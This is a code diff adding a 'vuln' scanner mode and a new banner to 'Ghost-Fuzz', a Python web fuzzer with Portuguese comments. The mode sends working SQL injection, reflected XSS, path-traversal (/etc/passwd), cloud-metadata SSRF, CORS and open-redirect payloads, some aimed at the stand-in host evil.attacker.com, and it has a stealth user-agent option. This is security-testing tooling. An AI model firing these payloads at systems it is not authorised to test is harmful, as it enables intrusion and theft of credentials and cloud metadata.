@@ -51,19 +51,59 @@ except ImportError:
     print("[-] Instale requests: pip install requests")
     sys.exit(1)
 
-VERSAO = "2.0.0"
+VERSAO = "2.1.0"
 
-BANNER = r"""
-   _____ _               _     ______
-  / ____| |             | |   |  ____|
- | |  __| |__   ___  ___| |_  | |__ _   _ ________
- | | |_ | '_ \ / _ \/ __| __| |  __| | | |_  /_  /
- | |__| | | | | (_) \__ \ |_  | |  | |_| |/ / / /
-  \_____|_| |_|\___/|___/\__| |_|   \__,_/___/___|
 
-  Ghost-Fuzz v{v}  |  Web Application Fuzzer
-  By Gh0st-Bx1  |  github.com/Ghost-Bx1
-""".format(v=VERSAO)
+def _build_banner():
+    import re as _re
+    G = "\033[92m"; Cy = "\033[96m"; D = "\033[2m"; N = "\033[1m"
+    W = "\033[97m"; X = "\033[0m"
+    IW = 68; eq = "\u2550" * IW; sp = " " * IW
+    TL = "\u2554"; TR = "\u2557"; BL = "\u255a"; BR = "\u255d"; VB = "\u2551"
+    hl = "\u2500" * 44; bar = "\u2502"
+    vl = lambda s: len(_re.sub(r"\x1b\[[0-9;]*m", "", s))
+
+    def _row(s):
+        n = vl(s); p = max(0, IW - n); l = p // 2; r = p - l
+        return f"{G}{VB}{X}{' ' * l}{s}{' ' * r}{G}{VB}{X}"
+
+    def _row_l(s):
+        n = vl(s); p = max(0, IW - n - 2)
+        return f"{G}{VB}{X}  {s}{' ' * p}{G}{VB}{X}"
+
+    ga = [
+        (f"{D}         {X}", f"{G}  .-\"\"\"\"\"\"\"\"\"-.  {X}", f"{D}         {X}"),
+        (f"{D}-- -..   {X}", f"{G} /  _       _  \\ {X}", f"{D}   ..- --{X}"),
+        (f"{D}----..   {X}", f"{G}| (:3 )  (:3 )  |{X}", f"{D}   ..----{X}"),
+        (f"{D}----..   {X}", f"{G}|   '--------'  |{X}", f"{D}   ..----{X}"),
+        (f"{D}-...     {X}", f"{G}|    \\ \\U/ /    |{X}", f"{D}     ...-{X}"),
+        (f"{D}         {X}", f"{G}|_______________|{X}", f"{D}         {X}"),
+        (f"{D}         {X}", f"{G} \\/\\/\\ /\\ /\\/\\/ {X}", f"{D}         {X}"),
+    ]
+
+    info = [
+        f"{G}{N}GHOST-FUZZ{X}",
+        f"{Cy}v{VERSAO}  {D}Web Fuzzer & Vulnerability Scanner{X}",
+        f"{D}{hl}{X}",
+        f"{W}By Gh0st-Bx1  {D}{bar}  github.com/Ghost-Bx1{X}",
+        f"{D}{hl}{X}",
+        f"{D}dir  param  vhost  header  graphql  jwt{X}",
+        f"{D}params  vuln  --sqli  --xss  --ssrf{X}",
+        f"{D}--lfi  --cors  --redirect  --stealth{X}",
+    ]
+
+    out = [f"{G}{TL}{eq}{TR}{X}", f"{G}{VB}{sp}{VB}{X}"]
+    for left, center, right in ga:
+        combined = left + center + right
+        out.append(_row(combined))
+    out.append(f"{G}{VB}{sp}{VB}{X}")
+    for i in info:
+        out.append(_row_l(i))
+    out += [f"{G}{VB}{sp}{VB}{X}", f"{G}{BL}{eq}{BR}{X}"]
+    return "\n".join(out)
+
+
+BANNER = _build_banner()
 
 C = {
     "R": "\033[91m", "G": "\033[92m", "Y": "\033[93m",
@@ -1024,6 +1064,212 @@ def gerar_relatorio(dados, arquivo):
 
 
 # ==============================================================================
+# VULN SCANNER
+# ==============================================================================
+
+def _detectar_sqli(url, timeout=5, proxy=None, stealth=False, verbose=False):
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    headers = {"User-Agent": _ua(stealth)}
+    erros = ["sql syntax", "mysql_fetch", "ora-", "pg_query", "sqlite3", "unclosed quotation",
+             "syntax error", "you have an error in your sql", "warning: mysql", "division by zero"]
+    payloads_err = ["'", '"', "' OR '1'='1", "1' AND SLEEP(0)--", "1;SELECT 1--"]
+    payloads_time = ["1' AND SLEEP(3)--", "1' WAITFOR DELAY '0:0:3'--", "1';SELECT pg_sleep(3)--"]
+    achados = []
+    base_url = url if "FUZZ" not in url else url.split("FUZZ")[0] + "1"
+    try:
+        for p in payloads_err:
+            test_url = base_url + p if "?" not in base_url else base_url + p
+            if "FUZZ" in url:
+                test_url = url.replace("FUZZ", requests.utils.quote(p, safe=""))
+            try:
+                r = requests.get(test_url, headers=headers, proxies=proxies, timeout=timeout, verify=False, allow_redirects=False)
+                for e in erros:
+                    if e in r.text.lower():
+                        achados.append({"tipo": "error-based", "payload": p, "indicador": e})
+                        if verbose:
+                            _log(f"SQLi error-based detectado: {p!r} -> {e!r}", "VULN")
+                        break
+            except Exception:
+                pass
+        for p in payloads_time:
+            if "FUZZ" in url:
+                test_url = url.replace("FUZZ", requests.utils.quote(p, safe=""))
+            else:
+                test_url = base_url + p
+            try:
+                t0 = time.time()
+                requests.get(test_url, headers=headers, proxies=proxies, timeout=timeout + 4, verify=False, allow_redirects=False)
+                elapsed = time.time() - t0
+                if elapsed >= 2.8:
+                    achados.append({"tipo": "time-based", "payload": p, "delay_s": round(elapsed, 2)})
+                    if verbose:
+                        _log(f"SQLi time-based: delay {elapsed:.1f}s com {p!r}", "VULN")
+            except Exception:
+                pass
+    except Exception:
+        pass
+    return achados
+
+
+def _detectar_xss(url, timeout=5, proxy=None, stealth=False, verbose=False):
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    headers = {"User-Agent": _ua(stealth)}
+    token = "GHXSS" + str(int(time.time()))[-4:]
+    payloads = [
+        f"<script>alert('{token}')</script>",
+        f"'\"><img src=x onerror=alert('{token}')>",
+        f"<svg onload=alert('{token}')>",
+    ]
+    achados = []
+    for p in payloads:
+        if "FUZZ" in url:
+            test_url = url.replace("FUZZ", requests.utils.quote(p, safe=""))
+        else:
+            test_url = url + requests.utils.quote(p, safe="")
+        try:
+            r = requests.get(test_url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
+            if token in r.text or p in r.text:
+                achados.append({"tipo": "reflected-xss", "payload": p})
+                if verbose:
+                    _log(f"XSS refletido detectado: {p!r}", "VULN")
+                break
+        except Exception:
+            pass
+    return achados
+
+
+def _detectar_lfi(url, timeout=5, proxy=None, stealth=False, verbose=False):
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    headers = {"User-Agent": _ua(stealth)}
+    payloads = [
+        "../../../../etc/passwd", "../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
+        "....//....//etc/passwd", "/etc/passwd", "C:\\windows\\system32\\drivers\\etc\\hosts",
+        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    ]
+    indicadores = ["root:x:", "daemon:", "[fonts]", "for 16-bit", "[extensions]"]
+    achados = []
+    for p in payloads:
+        if "FUZZ" in url:
+            test_url = url.replace("FUZZ", p)
+        else:
+            sep = "&" if "?" in url else "?"
+            test_url = url + sep + "file=" + requests.utils.quote(p, safe="")
+        try:
+            r = requests.get(test_url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
+            for ind in indicadores:
+                if ind in r.text:
+                    achados.append({"tipo": "lfi", "payload": p, "indicador": ind})
+                    if verbose:
+                        _log(f"LFI detectado: {p!r} -> {ind!r}", "VULN")
+                    break
+        except Exception:
+            pass
+    return achados
+
+
+def _detectar_ssrf(url, timeout=6, proxy=None, stealth=False, verbose=False):
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    headers = {"User-Agent": _ua(stealth)}
+    imds_endpoints = [
+        ("AWS", "http://169.254.169.254/latest/meta-data/"),
+        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+        ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
+    ]
+    indicadores_aws = ["ami-id", "instance-id", "iam"]
+    indicadores_az = ["compute", "network", "subscriptionId"]
+    indicadores_gcp = ["instance", "project", "attributes"]
+    achados = []
+    for cloud, endpoint in imds_endpoints:
+        if "FUZZ" in url:
+            test_url = url.replace("FUZZ", requests.utils.quote(endpoint, safe=""))
+        else:
+            sep = "&" if "?" in url else "?"
+            test_url = url + sep + "url=" + requests.utils.quote(endpoint, safe="")
+        try:
+            r = requests.get(test_url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
+            inds = indicadores_aws if cloud == "AWS" else (indicadores_az if cloud == "Azure" else indicadores_gcp)
+            for ind in inds:
+                if ind in r.text.lower():
+                    achados.append({"tipo": "ssrf-imds", "cloud": cloud, "endpoint": endpoint})
+                    if verbose:
+                        _log(f"SSRF/IMDS {cloud}: {endpoint}", "VULN")
+                    break
+        except Exception:
+            pass
+    return achados
+
+
+def _verificar_cors(url, timeout=5, proxy=None, stealth=False, verbose=False):
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    evil_origin = "https://evil.attacker.com"
+    headers = {"User-Agent": _ua(stealth), "Origin": evil_origin}
+    achados = []
+    try:
+        r = requests.get(url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
+        acao = r.headers.get("Access-Control-Allow-Origin", "")
+        credenciais = r.headers.get("Access-Control-Allow-Credentials", "")
+        if evil_origin in acao or acao == "*":
+            if credenciais.lower() == "true":
+                achados.append({"tipo": "cors-wildcard-credentials", "acao": acao})
+                if verbose:
+                    _log(f"CORS critico: Allow-Credentials + origin evil", "VULN")
+            else:
+                achados.append({"tipo": "cors-wildcard", "acao": acao})
+                if verbose:
+                    _log(f"CORS wildcard: {acao}", "VULN")
+    except Exception:
+        pass
+    return achados
+
+
+def _detectar_redirect(url, timeout=5, proxy=None, stealth=False, verbose=False):
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    headers = {"User-Agent": _ua(stealth)}
+    payloads = [
+        "https://evil.attacker.com", "//evil.attacker.com", "/\\evil.attacker.com",
+        "https:///evil.attacker.com", "http://evil.attacker.com@trusted.com",
+    ]
+    achados = []
+    for p in payloads:
+        if "FUZZ" in url:
+            test_url = url.replace("FUZZ", requests.utils.quote(p, safe=""))
+        else:
+            sep = "&" if "?" in url else "?"
+            test_url = url + sep + "redirect=" + requests.utils.quote(p, safe="")
+        try:
+            r = requests.get(test_url, headers=headers, proxies=proxies, timeout=timeout,
+                             verify=False, allow_redirects=False)
+            loc = r.headers.get("Location", "")
+            if "evil.attacker.com" in loc or (loc and (loc.startswith("http://evil") or loc.startswith("//evil"))):
+                achados.append({"tipo": "open-redirect", "payload": p, "location": loc})
+                if verbose:
+                    _log(f"Open Redirect: {p!r} -> {loc!r}", "VULN")
+                break
+        except Exception:
+            pass
+    return achados
+
+
+def fuzzing_vuln(url, checks, timeout=5, proxy=None, stealth=False, verbose=False):
+    resultado = {"url": url, "achados": {}}
+    mapa = {
+        "sqli": _detectar_sqli, "xss": _detectar_xss, "lfi": _detectar_lfi,
+        "ssrf": _detectar_ssrf, "cors": _verificar_cors, "redirect": _detectar_redirect,
+    }
+    for check in checks:
+        fn = mapa.get(check)
+        if fn:
+            _log(f"Testando {check.upper()} em {url}", "INFO")
+            r = fn(url, timeout=timeout, proxy=proxy, stealth=stealth, verbose=verbose)
+            resultado["achados"][check] = r
+            if r:
+                print(f"  {C['R']}{C['N']}[VULN]{C['X']} {check.upper()}: {len(r)} achado(s)")
+            else:
+                print(f"  {C['G']}[OK]{C['X']} {check.upper()}: nenhuma vulnerabilidade encontrada")
+    return resultado
+
+
+# ==============================================================================
 # CLI
 # ==============================================================================
 
@@ -1091,8 +1337,19 @@ def main():
     p_jwt.add_argument("--param", default="token",
                        help="Nome do parametro GET que recebe o token (padrao: token)")
 
+    # Modo VULN (Vulnerability Scanner)
+    p_vuln = sub.add_parser("vuln", help="Scanner de vulnerabilidades web (SQLi/XSS/LFI/SSRF/CORS/Redirect)")
+    p_vuln.add_argument("-u", "--url", required=True, help="URL alvo (use FUZZ como marcador de payload)")
+    p_vuln.add_argument("--sqli", action="store_true", help="Testar SQL Injection")
+    p_vuln.add_argument("--xss", action="store_true", help="Testar Cross-Site Scripting refletido")
+    p_vuln.add_argument("--lfi", action="store_true", help="Testar Local File Inclusion")
+    p_vuln.add_argument("--ssrf", action="store_true", help="Testar SSRF/IMDS (AWS/Azure/GCP)")
+    p_vuln.add_argument("--cors", action="store_true", help="Testar CORS misconfiguration")
+    p_vuln.add_argument("--redirect", action="store_true", help="Testar Open Redirect")
+    p_vuln.add_argument("--all", action="store_true", dest="vuln_all", help="Executar todos os testes")
+
     # Opcoes globais para todos os modos
-    for p in [p_dir, p_param, p_vhost, p_params, p_hdrs, p_gql, p_jwt]:
+    for p in [p_dir, p_param, p_vhost, p_params, p_hdrs, p_gql, p_jwt, p_vuln]:
         p.add_argument("--threads", type=int, default=40, help="Threads (padrao: 40)")
         p.add_argument("--timeout", type=float, default=5, help="Timeout por req (padrao: 5)")
         p.add_argument("--proxy", help="Proxy (ex: http://127.0.0.1:8080)")
@@ -1249,6 +1506,27 @@ def main():
             timeout=args.timeout, verbose=args.verbose,
         )
         resultados["jwt"] = r
+
+    elif args.modo == "vuln":
+        checks = []
+        if args.vuln_all:
+            checks = ["sqli", "xss", "lfi", "ssrf", "cors", "redirect"]
+        else:
+            if args.sqli: checks.append("sqli")
+            if args.xss: checks.append("xss")
+            if args.lfi: checks.append("lfi")
+            if args.ssrf: checks.append("ssrf")
+            if args.cors: checks.append("cors")
+            if args.redirect: checks.append("redirect")
+        if not checks:
+            _log("Selecione ao menos um: --sqli --xss --lfi --ssrf --cors --redirect --all", "ERRO")
+            sys.exit(1)
+        _log(f"Alvo: {args.url} | Testes: {', '.join(checks)}", "INFO")
+        r = fuzzing_vuln(
+            args.url, checks, timeout=args.timeout,
+            proxy=args.proxy, stealth=args.stealth, verbose=args.verbose,
+        )
+        resultados["vuln"] = r
 
     if args.output:
         gerar_relatorio(resultados, args.output)
